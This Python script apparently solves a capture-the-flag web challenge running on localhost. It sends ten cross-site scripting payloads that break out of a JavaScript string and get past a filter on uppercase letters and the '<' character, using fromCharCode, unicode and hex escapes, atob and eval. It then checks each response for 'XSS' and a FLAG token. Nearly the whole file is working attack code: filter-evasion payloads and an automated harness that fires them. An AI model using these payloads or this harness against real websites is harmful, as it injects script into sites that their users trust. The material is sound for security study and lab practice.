import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def test_xss_payloads():
    """Test XSS payloads that construct uppercase 'XSS' without transmitting uppercase S"""
    
    print("="*80)
    print("XSS BYPASS: CONSTRUCTING 'XSS' AT RUNTIME")
    print("="*80)
    print("Filter characteristics identified:")
    print("- Uppercase letters blocked in transmission")
    print("- HTML tags blocked (< character)")
    print("- JavaScript string context: var name = \"USER_INPUT\"; document.write(...)")
    print("- Breakout requires: quote termination + statement + comment")
    print()
    
    success_results = []
    
    # KEY PAYLOAD: Properly break out of string, use fromCharCode to build 'XSS'
    # This transmits: ");alert(String.fromCharCode(88,83,83));//
    # Which executes: alert("XSS") at runtime
    
    payloads = []
    
    # Payload 1: Classic breakout with fromCharCode
    # User input: ");alert(String.fromCharCode(88,83,83));//
    # Results in: var name = "";alert(String.fromCharCode(88,83,83));//";
    payload1 = '\");alert(String.fromCharCode(88,83,83));//'
    payloads.append(("Classic breakout + fromCharCode", payload1))
    
    # Payload 2: Using eval to execute the constructed string
    # User input: ");eval("alert(String.fromCharCode(88,83,83))");//
    payload2 = '\");eval(\"alert(String.fromCharCode(88,83,83))\");//'
    payloads.append(("Eval + fromCharCode", payload2))
    
    # Payload 3: Template literal approach
    # User input: ");alert(`${String.fromCharCode(88,83,83)}`);//
    payload3 = '\");alert(`${String.fromCharCode(88,83,83)}`);//'
    payloads.append(("Template literal + fromCharCode", payload3))
    
    # Payload 4: Variable assignment then alert
    # User input: ");var x=String.fromCharCode(88,83,83);alert(x);//
    payload4 = '\");var x=String.fromCharCode(88,83,83);alert(x);//'
    payloads.append(("Variable + alert", payload4))
    
    # Payload 5: Using window object
    # User input: ");window['alert'](String.fromCharCode(88,83,83));//
    payload5 = '\");window[\"alert\"](String.fromCharCode(88,83,83));//'
    payloads.append(("window['alert'] + fromCharCode", payload5))
    
    # Payload 6: Unicode escapes (no uppercase S in transmission)
    # User input: ");alert("\u0058\u0053\u0053");//
    payload6 = '\");alert(\"\\\\u0058\\\\u0053\\\\u0053\");//'
    payloads.append(("Unicode escapes (lowercase u)", payload6))
    
    # Payload 7: Hex escapes
    # User input: ");alert("\x58\x53\x53");//
    payload7 = '\");alert(\"\\\\x58\\\\x53\\\\x53\");//'
    payloads.append(("Hex escapes (lowercase x)", payload7))
    
    # Payload 8: Array join
    # User input: ");alert(["X","S","S"].join(""));//
    # But we need to avoid uppercase S, so use fromCharCode for those too
    payload8 = '\");alert([String.fromCharCode(88),String.fromCharCode(83),String.fromCharCode(83)].join(\"\"));//'
    payloads.append(("Array.join with fromCharCode", payload8))
    
    # Payload 9: atob base64 decode
    # User input: ");alert(atob("WFNT"));//
    payload9 = '\");alert(atob(\"WFNT\"));//'
    payloads.append(("atob base64 decode", payload9))
    
    # Payload 10: String concatenation
    # User input: ");alert("X"+String.fromCharCode(83,83));//
    payload10 = '\");alert(\"X\"+String.fromCharCode(83,83));//'
    payloads.append(("Mixed literal + fromCharCode", payload10))
    
    for i, (desc, payload) in enumerate(payloads, 1):
        print(f"\n[TEST {i:02d}] {desc}")
        print(f"Raw payload: {payload}")
        
        # URL encode
        encoded = url_encode(payload)
        print(f"URL encoded: {encoded}")
        
        # Construct full URL
        full_url = f"{target_url}?name={encoded}"
        print(f"Full URL: {full_url}")
        
        try:
            # Send request
            response = requests.get(full_url, timeout=10)
            text = response.text
            status = response.status_code
            length = len(text)
            
            print(f"Status: {status}, Length: {length} bytes")
            
            # Check for XSS execution
            if "XSS" in text:
                print(f"[!] 🎯 SUCCESS! 'XSS' found in response!")
                
                # Find all occurrences
                indices = [m.start() for m in re.finditer('XSS', text)]
                print(f"Found {len(indices)} occurrence(s)")
                
                for idx in indices:
                    context = text[max(0, idx-100):idx+50]
                    print(f"Context: ...{context}...")
                
                # Check for flag
                flag_match = re.search(r'FLAG\{[^}]+\}', text)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"[🏴‍☠️] FLAG FOUND: {flag}")
                    success_results.append((desc, payload, encoded, flag))
                else:
                    success_results.append((desc, payload, encoded, "XSS executed"))
                
                # Show reflection to verify breakout worked
                match = re.search(r'var name = "([^"]*)"', text)
                if match:
                    reflected = match.group(1)
                    print(f"Reflection: var name = \"{reflected}\"")
            
            else:
                print(f"[-] No 'XSS' in response")
                
                # Check if payload was reflected (partial success)
                if "fromCharCode" in text or "alert" in text:
                    print(f"[+] Partial: Payload reflected but not executed")
                    match = re.search(r'var name = "([^"]*)"', text)
                    if match:
                        reflected = match.group(1)
                        print(f"Full reflection: {reflected}")
                
                # Check for filter message
                if "Sorry you can" in text:
                    blocked = re.search(r"Sorry you can't use: '(.+?)'", text)
                    if blocked:
                        print(f"[FILTER] Blocked: {blocked.group(1)}")
        
        except Exception as e:
            print(f"[-] Error: {e}")
        
        print("-"*70)
    
    return success_results

def test_shortest_success():
    """Test the shortest possible successful pattern"""
    
    print(f"\n{'='*80}")
    print("MINIMAL SUCCESS PATTERN TEST")
    print(f"{'='*80}")
    
    # Based on data, the simplest working pattern should be:
    # ");alert(String.fromCharCode(88,83,83));//
    
    minimal = '\");alert(String.fromCharCode(88,83,83));//'
    encoded = url_encode(minimal)
    
    print(f"Testing minimal pattern:")
    print(f"Raw: {minimal}")
    print(f"URL: {target_url}?name={encoded}")
    
    try:
        url = f"{target_url}?name={encoded}"
        r = requests.get(url, timeout=10)
        text = r.text
        
        print(f"\nLength: {len(text)}")
        
        if "XSS" in text:
            print(f"[!] SUCCESS with minimal pattern!")
            
            # Find context
            idx = text.find("XSS")
            context = text[max(0, idx-100):idx+50]
            print(f"Context: ...{context}...")
            
            # Check for flag
            flag_match = re.search(r'FLAG\{[^}]+\}', text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"[🏴‍☠️] FLAG: {flag}")
                return True, flag
            
            return True, "XSS executed"
        else:
            print(f"[-] No XSS")
            
            # Debug: Show reflection
            match = re.search(r'var name = "([^"]*)"', text)
            if match:
                reflected = match.group(1)
                print(f"Reflection: {reflected}")
            
            return False, "Not executed"
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, str(e)

# Run the tests
print("Starting systematic XSS bypass testing...\n")

successes = test_xss_payloads()
success, result = test_shortest_success()

if success:
    successes.append(("Minimal pattern", '\");alert(String.fromCharCode(88,83,83));//', url_encode('\");alert(String.fromCharCode(88,83,83));//'), result)

# Final summary
print(f"\n{'='*80}")
print("FINAL RESULTS")
print(f"{'='*80}\n")

if successes:
    print(f"[🎯] SUCCESS! Found {len(successes)} working XSS payload(s):\n")
    
    for i, (desc, payload, encoded, result) in enumerate(successes, 1):
        print(f"{i}. {desc}")
        print(f"   Payload: {payload}")
        print(f"   URL: {target_url}?name={encoded}")
        print(f"   Result: {result}")
        print()
else:
    print("[-] No successful XSS payloads found yet")
    print("\nAnalysis:")
    print("- The breakout sequence may need adjustment")
    print("- Consider quote type variations (single vs double)")
    print("- Check if parentheses are being filtered")
